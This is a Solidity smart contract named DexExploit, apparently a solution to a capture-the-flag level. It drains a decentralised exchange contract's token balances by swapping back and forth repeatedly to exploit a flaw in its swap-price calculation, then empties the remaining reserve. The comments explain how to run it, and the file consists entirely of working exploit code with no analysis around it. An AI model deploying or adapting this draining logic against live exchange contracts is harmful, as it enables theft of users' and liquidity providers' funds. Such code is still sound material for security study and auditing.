// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

interface Dex {
  
  function setTokens(address _token1, address _token2) external;  
  function swap(address from, address to, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
  function approve(address spender, uint amount) external;
  function balanceOf(address token, address account) external view returns (uint);
  function token1() external view returns (address);
  function token2() external view returns (address);
}

contract DexExploit{
  //First get allowance for tokens manually, transfer tokens with transferTokenToContract() and then pwn()

  Dex targetContract;
  address targetAddress;
  address tokenOne;
  address tokenTwo;
  
  constructor(address _address){
      targetAddress = _address;
      targetContract = Dex(_address);
      tokenOne= targetContract.token1();
      tokenTwo= targetContract.token2();
  }
  

  function setContractAddress(address _address) public{
      targetAddress = _address;
      targetContract = Dex(_address);
      tokenOne= targetContract.token1();
      tokenTwo= targetContract.token2();
  }

  function transferTokenToContract(address _address) public {
      IERC20(tokenOne).transferFrom(_address, address(this), targetContract.balanceOf(tokenOne,_address));      //Tr
      IERC20(tokenTwo).transferFrom(_address, address(this), targetContract.balanceOf(tokenTwo,_address));      
  }


  function pwn() public{
      //require(targetContract.balanceOf(tokenOne,address(this))  10, "Dont have access to full amount of token1");
      //require(targetContract.balanceOf(tokenTwo,address(this)) == 10, "Dont have access to full amount of token2");

      uint tokenAmount= targetContract.balanceOf(tokenOne,address(this));    

      //Condition in words: As long as with our buying power for Token A, we do not exceed the dex's balance of Token A...
      while(targetContract.getSwapPrice(tokenOne, tokenTwo, tokenAmount) <= targetContract.balanceOf(tokenTwo,address(targetAddress))){
          //Do a full swap
          tokenAmount = targetContract.balanceOf(tokenOne,address(this));          
          targetContract.approve(targetAddress, tokenAmount);
          targetContract.swap(tokenOne, tokenTwo, tokenAmount);
          (tokenOne, tokenTwo) = (tokenTwo, tokenOne);
          tokenAmount = targetContract.balanceOf(tokenOne,address(this));          
      }

      if(targetContract.balanceOf(tokenOne,address(targetAddress)) > 0 && targetContract.balanceOf(tokenTwo,address(targetAddress)) > 0){
        //Drain the remains.        
        if(targetContract.balanceOf(tokenOne,address(targetAddress)) > targetContract.balanceOf(tokenTwo,address(targetAddress))){
            
            tokenAmount = targetContract.getSwapPrice(tokenOne, tokenTwo, targetContract.balanceOf(tokenOne,address(targetAddress) ));
            targetContract.approve(targetAddress, tokenAmount);
            targetContract.swap(tokenTwo,tokenOne,tokenAmount);
        }
        else{
            tokenAmount = targetContract.getSwapPrice(tokenTwo, tokenOne, targetContract.balanceOf(tokenTwo,address(targetAddress) ));
            targetContract.approve(targetAddress, tokenAmount);
            targetContract.swap(tokenOne, tokenTwo,tokenAmount);
        }
      }
      
  }
}